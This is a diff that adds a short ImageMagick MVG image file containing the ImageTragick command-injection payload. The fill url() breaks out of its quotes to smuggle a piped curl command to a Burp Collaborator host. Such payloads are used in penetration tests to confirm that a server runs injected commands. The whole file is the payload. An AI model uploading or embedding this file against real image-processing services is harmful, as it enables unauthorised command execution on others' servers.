@@ -1,0 +1,4 @@
+push graphic-context 
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg "|curl s3w575of9616oxk67dwp0u8c238twi.burpcollaborator.net")'
+pop graphic-context
